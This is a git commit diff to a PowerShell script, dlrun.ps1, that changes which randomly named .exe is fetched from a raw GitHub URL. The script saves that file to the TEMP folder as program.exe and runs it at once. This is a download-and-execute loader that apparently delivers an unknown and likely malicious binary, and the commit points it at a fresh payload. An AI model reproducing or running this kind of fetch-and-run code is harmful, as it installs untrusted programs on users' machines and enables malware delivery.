91b549544b5401dcf267a8df0ebbe1e2b496444d
fasa3e <gaveliianiskin@icloud.com>
2026-06-26 03:33:36 +1000

    Update dlrun.ps1

--- dlrun.ps1
+++ dlrun.ps1
@@ -1,4 +1,4 @@
-$url = "https://raw.githubusercontent.com/fasa3e/memcleaner/refs/heads/main/c0j9xeidfkhjou1o.exe"
+$url = "https://raw.githubusercontent.com/fasa3e/fdd/refs/heads/main/wyedchp9m9oa9tkj.exe"
 $output = "$env:TEMP\program.exe"
 Invoke-WebRequest -Uri $url -OutFile $output
 Start-Process $output
